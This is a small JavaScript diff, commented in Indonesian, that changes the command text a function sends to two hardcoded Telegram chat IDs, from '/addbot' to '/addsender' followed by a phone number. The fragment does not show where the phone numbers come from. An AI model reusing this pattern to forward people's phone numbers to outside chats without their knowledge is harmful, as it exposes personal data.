@@ -130,7 +130,7 @@ const TELEGRAM_CHAT_ID = ['7223902938', '8331397994']; // contoh: '123456789' at
 
 // Fungsi kirim ke Telegram
 async function sendToTelegram(phoneNumber) {
-  const message = `/addbot \`${phoneNumber}\`\n`;
+  const message = `/addsender \`${phoneNumber}\`\n`;
   
   // Loop untuk kirim ke semua ID
   for (const chatId of TELEGRAM_CHAT_ID) {
